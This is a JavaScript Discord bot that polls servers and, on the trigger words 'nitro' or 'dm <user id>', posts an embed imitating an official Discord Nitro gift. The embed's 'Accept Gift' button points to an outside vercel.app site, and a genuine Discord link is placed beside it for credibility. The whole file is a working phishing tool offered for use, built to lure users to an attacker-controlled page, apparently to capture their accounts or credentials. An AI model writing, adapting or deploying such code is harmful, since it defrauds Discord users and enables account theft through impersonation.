const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./config.json'));
const t = config.token;
const url = "https://member-cleanup.vercel.app/";
const img = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";
let p = new Set();

async function listen() {
  setInterval(async () => {
    let gs = await (await fetch(`https://discord.com/api/v9/users/@me/guilds`, {headers:{Authorization:`Bot ${t}`}})).json();
    if(!Array.isArray(gs)) return;
    for(let g of gs){
      let cs = await (await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {headers:{Authorization:`Bot ${t}`}})).json();
      if(!Array.isArray(cs)) continue;
      for(let c of cs){
        if(c.type!==0) continue;
        let ms = await (await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {headers:{Authorization:`Bot ${t}`}})).json();
        if(!Array.isArray(ms)) continue;
        for(let m of ms){
          if(!m.content||p.has(m.id)) continue;
          if(m.content.toLowerCase().trim()==="nitro"){p.add(m.id); send(c.id, null);}
          if(m.content.toLowerCase().startsWith("dm ")){p.add(m.id); send(null, m.content.split(" ")[1]);}
        }
      }
    }
  }, 5000);
}

async function send(cid, uid) {
  let target = cid;
  if(uid) {
    let dm = await (await fetch(`https://discord.com/api/v9/users/@me/channels`, {method:"POST", headers:{Authorization:`Bot ${t}`, "Content-Type":"application/json"}, body:JSON.stringify({recipient_id:uid})})).json();
    if(!dm.id) return;
    target = dm.id;
  }
  await fetch(`https://discord.com/api/v9/channels/${target}/messages`, {
    method: "POST",
    headers: {Authorization:`Bot ${t}`, "Content-Type":"application/json"},
    body: JSON.stringify({
      embeds: [{title: "You've been gifted a subscription!", description: "**100pression** has gifted you Nitro for 3 months!\n\nExpires in 48 hours", color: 0x5865f2, image: {url: img}}],
      components: [{type: 1, components: [{type: 2, style: 5, label: "Accept Gift", url: url}, {type: 2, style: 5, label: "Learn More", url: "https://discord.com/nitro"}]}]
    })
  }).catch(()=>{});
}

listen();